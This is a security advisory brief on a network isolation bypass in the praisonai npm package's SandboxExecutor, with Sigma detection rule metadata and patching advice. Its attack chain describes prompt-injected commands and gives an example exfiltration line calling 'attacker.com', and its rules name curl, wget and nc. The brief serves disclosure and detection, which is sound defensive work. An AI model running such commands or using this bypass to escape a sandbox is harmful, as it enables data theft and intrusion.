---
title: npm PraisonAI SandboxExecutor Network Isolation Bypass Vulnerability (GHSA-gqmf-56h7-rrpf)
slug: 2026-06-npm-praisonai-network-bypass
description: The npm package `praisonai` versions 1.2.3 through 1.7.1 contain a network isolation bypass vulnerability (GHSA-gqmf-56h7-rrpf) in its `SandboxExecutor` component's `network-isolated` mode, allowing non-proxy-aware client commands to establish direct network connections, leading to potential data exfiltration and access to internal services.
date: "2026-06-18T15:06:26Z"
type: threat
types:
  - threat
severities:
  - high
tags:
  - vulnerability
  - npm
  - sandbox
  - network-bypass
  - ghsa
vendors:
  - MervinPraison
products:
  - praisonai (>= 1.2.3, <= 1.7.1)
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
  - tactic_id: TA0009
    tactic_name: Collection
    technique_id: T1005
    technique_name: Data from Local System
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
references:
  - https://github.com/advisories/GHSA-gqmf-56h7-rrpf
rules:
  - title: Detect GHSA-gqmf-56h7-rrpf Exploitation - Suspicious Network Utility Execution
    description: Detects exploitation of GHSA-gqmf-56h7-rrpf - Execution of common network utilities (curl, wget, nc) by a shell, potentially indicating a network isolation bypass in praisonai's SandboxExecutor.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
      - defense_evasion
    techniques:
      - T1071.001
      - T1564.004
    data_sources:
      - process_creation
      - linux
  - title: Detect GHSA-gqmf-56h7-rrpf Exploitation - Suspicious Scripted Network Access
    description: Detects exploitation of GHSA-gqmf-56h7-rrpf - Execution of Node.js or Python with command-line arguments indicating direct network access, potentially bypassing praisonai sandbox isolation.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
      - execution
    techniques:
      - T1059.006
      - T1059.007
      - T1071.001
    data_sources:
      - process_creation
      - linux
rules_count: 2
---

The npm package `praisonai`, specifically versions 1.2.3 up to and including 1.7.1, is affected by a critical network isolation bypass vulnerability identified as GHSA-gqmf-56h7-rrpf. The `SandboxExecutor` component in `network-isolated` mode, which is advertised to provide "No network access," fails to implement robust OS-level network restrictions. Instead, it only injects proxy environment variables (e.g., `http_proxy`, `https_proxy` set to `localhost:0`) into the child processes. This mechanism is insufficient for true network isolation, as any non-proxy-aware client or direct socket API call within the sandboxed command environment will bypass these variables and establish direct network connections. This flaw undermines the security guarantees applications rely on when executing untrusted or user-supplied code via `praisonai`, potentially enabling attackers to exfiltrate sensitive data or access internal network resources.

## Attack Chain

1.  An attacker crafts malicious input, such as a prompt-injected command, and submits it to an application utilizing the `praisonai` library.
2.  The vulnerable application executes the attacker-supplied command within the `SandboxExecutor` component, configured for `network-isolated` mode.
3.  The `SandboxExecutor` spawns a child process (e.g., `sh -c [attacker_controlled_command]`), inheriting environment variables like `http_proxy=http://localhost:0`.
4.  The attacker-controlled command, for instance, `curl http://attacker.com/data`, executes a non-proxy-aware network client or direct socket API call.
5.  The non-proxy-aware client or API ignores the injected proxy environment variables and attempts to establish a direct outbound network connection.
6.  The operating system permits the direct connection, effectively bypassing the intended `network-isolated` sandbox boundary.
7.  The attacker's command successfully exfiltrates data from the compromised environment or accesses internal network services.

## Impact

The network isolation bypass in `praisonai` can lead to severe consequences for applications relying on its sandbox for security. If exploited, attackers can circumvent the intended network restrictions to exfiltrate sensitive data (e.g., local files, process output, environment variables) from the sandboxed command context. Furthermore, this vulnerability allows access to localhost services or internal network resources reachable from the host running the `praisonai` instance, potentially enabling lateral movement or further compromise. It can also permit requests to cloud metadata or service endpoints, leading to credential theft or escalation of privileges. Ultimately, the flaw enables bypass of application policies that assume command execution occurs without network access, compromising the integrity and confidentiality of the host system.

## Recommendation

*   **Patch CVE-GHSA-gqmf-56h7-rrpf immediately** by upgrading the `praisonai` npm package to a version that contains a fix, or implement a workaround that employs OS-level network restrictions.
*   **Deploy the Sigma rules in this brief to your SIEM** to detect suspicious network utility execution originating from processes likely spawned by `praisonai`'s `SandboxExecutor`.
*   **Enable `process_creation` logging for all Linux servers** that run applications using the `praisonai` package to capture `sh`, `curl`, `wget`, `node`, and `python` command line arguments.
*   **Review `network_connection` logs** from systems using `praisonai` for outbound connections initiated by non-standard or unexpected processes to external or internal destinations.
